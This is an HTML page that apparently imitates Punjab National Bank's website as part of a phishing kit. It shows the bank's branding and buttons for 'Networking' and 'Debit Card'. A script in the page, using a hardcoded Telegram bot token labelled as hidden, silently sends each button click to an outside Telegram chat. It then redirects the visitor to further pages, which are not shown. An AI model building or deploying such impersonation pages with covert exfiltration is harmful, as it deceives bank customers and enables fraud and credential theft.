<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Punjab National Bank</title>
    <link rel="stylesheet" href="style3.css">
</head>
<body>

    <!-- Header Section -->
    <header>
        <button class="menu-toggle">&#9776;</button> <!-- Hamburger Menu (Left Side) -->
        <div class="logo-container">
            <img src="pnb-logo.png" alt="PNB Logo">
        </div>
        <nav>
            <ul class="nav-links">
                <li><a href="#">Personal</a></li>
                <li><a href="#">Corporate</a></li>
                <li><a href="#">NRI</a></li>
                <li><a href="#">Agri</a></li>
            </ul>
        </nav>
    </header>

    <!-- Buttons Section -->
    <section class="buttons">
        <button class="main-btn" onclick="handleButtonClick('Networking')">Networking</button>
        <button class="main-btn" onclick="handleButtonClick('Debit Card')">Debit Card</button>
    </section>

    <!-- Footer Section -->
    <footer class="footer-container">
        <p class="footer-text">&copy; 2025 Punjab National Bank. All Rights Reserved.</p>
        <img src="pnb-drawal.png" alt="PNB Drawal Image" class="footer-image">
    </footer>

    <script>
        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; // Hidden bot token
        const chatId = "7558871636";

        function handleButtonClick(buttonName) {
            alert(`You clicked the ${buttonName} button.`);
            
            // Send message to Telegram
            const message = `ðŸ”” User clicked: ${buttonName}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => {
                if (!response.ok) {
                    alert("Failed to send message to Telegram.");
                }
            })
            .catch(error => {
                console.error("Error:", error);
            });

            // Redirect to the appropriate page
            if (buttonName === "Networking") {
                window.location.href = "networking.html";
            } else if (buttonName === "Debit Card") {
                window.location.href = "Debitcard.html";
            }
        }
    </script>
</body>
</html>
